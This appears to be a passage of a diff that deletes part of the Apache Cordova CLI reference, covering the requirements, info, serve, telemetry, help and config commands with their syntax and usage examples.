-Checks and print out all the requirements for platforms specified (or all platforms added
-to project if none specified). If all requirements for each platform are met, exits with code 0
-otherwise exits with non-zero code.
-
-This can be useful when setting up a machine for building a particular platform.
-
-**Command Syntax:**
-
-```bash
-cordova requirements [platform?]
-```
-
-## `cordova info` command
-
-Print out useful information helpful for submitting bug
-reports and getting help.
-
-**Command Syntax:**
-
-```bash
-cordova info
-```
-
-## `cordova serve` command
-
-Run a local web server for www/ assets using specified `port` or default of 8000. Access projects at: `http://HOST_IP:PORT/PLATFORM/www`
-
-**Command Syntax:**
-
-```bash
-cordova serve [port]
-```
-
-## `cordova telemetry` command
-
-Turns telemetry collection on or off.
-
-**Command Syntax:**
-
-```bash
-cordova telemetry [State]
-```
-
-| State       | Description
-|-------------|------------------
-| on          | Turn telemetry collection on.
-| off         | Turn telemetry collection off.
-
-### Details
-
-A timed prompt asking the user to opt-in or out is displayed the first time cordova is run.
-It lasts for 30 seconds, after which the user is automatically opted-out if they don't provide any answer.
-In CI environments, the `CI` environment variable can be set, which will prevent the prompt from showing up.
-Telemetry collection can also be turned off on a single command by using the `--no-telemetry` flag.
-
-**Usage Example:**
-
-```bash
-cordova telemetry on
-cordova telemetry off
-cordova build --no-telemetry
-```
-
-For details, see our privacy notice: https://cordova.apache.org/privacy
-
-## `cordova help` command
-
-Show syntax summary, or the help for a specific command.
-
-**Command Syntax:**
-
-```bash
-cordova help [command]
-cordova [command] -h
-cordova -h [command]
-```
-
-## `cordova config` command
-
-Set, get, delete, edit, and list global cordova options.
-
-**Command Syntax:**
-
-```bash
-cordova config [ls|edit|set|get|delete] <key?> <value?>
-```
-
-**Usage Examples:**
-
-```bash
-cordova config ls
-cordova config edit
-cordova config set save-exact true
-cordova config get save-exact
-cordova config delete save-exact
-```
-
-[Hooks guide]: http://cordova.apache.org/docs/en/latest/guide_appdev_hooks_index.md.html
-[config.xml ref]: http://cordova.apache.org/docs/en/latest/config_ref/index.html
-[Cordova dependencies]: http://cordova.apache.org/docs/en/latest/guide/hybrid/plugins/index.html#specifying-project-requirements
-[scoped npm package]: https://docs.npmjs.com/misc/scope
